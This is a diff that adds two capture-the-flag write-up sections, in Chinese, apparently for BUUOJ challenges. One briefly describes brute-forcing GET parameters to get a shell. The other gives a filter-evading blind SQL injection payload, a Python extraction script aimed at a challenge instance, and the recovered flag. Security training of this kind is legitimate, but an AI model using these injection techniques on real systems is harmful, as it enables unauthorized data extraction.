@@ -271,7 +271,67 @@ Array
 
 构造payload :`*,1`
 
+### 高明的黑客
 
+题目提供的文件却是在网站上,但是不知道哪里能命令执行
+
+
+
+还有网站的配置也很奇怪
+
+
+
+写个脚本把所有GET参数爆破一遍得到shell
+
+
+
+
+
+### Hack World
+
+> All You Want Is In Table 'flag' and the column is 'flag'
+
+过滤:`+,#,-,反引号,*,空格,`
+
+`id=2/2`=>`id=1`,注入参数为数字,不需要逃逸引号
+
+`2/sleep(3)` => sleep 3s
+
+
+
+`if(substr(hex((select(flag)from(flag))),1,1)>0,9999,1)`
+
+成功回显`Error Occured When Fetch Result.`,失败回显`need girl friend`
+
+```python
+
+import requests
+import time
+burp0_url = "http://fb5adfb5-4ffa-47bb-a286-32e821c46a6a.node3.buuoj.cn:80/index.php"
+burp0_headers = {"Cache-Control": "max-age=0", "Origin": "http://fb5adfb5-4ffa-47bb-a286-32e821c46a6a.node3.buuoj.cn", "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "Referer": "http://fb5adfb5-4ffa-47bb-a286-32e821c46a6a.node3.buuoj.cn/", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close"}
+burp0_data = {"id": "if(substr(hex((select(flag)from(flag))),1,1)=char(a),1111,1)"}
+requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
+
+result=""
+alnlist="0123456789ABCDEF"
+i=len(result)
+while True:
+    for j in alnlist:
+        burp0_data = {"id": "if(substr(hex((select(flag)from(flag))),{},1)=char({}),1111,1)".format(i+1,ord(j))}
+        res=requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
+        if "Error Occured When Fetch Result." in res.text:
+            result+=j
+            print(result)
+            break
+        time.sleep(0.5)
+    i+=1
+
+
+```
+
+
+
+flag{f475e0ca-7337-4331-b968-13555bb2d874}
 
 
 
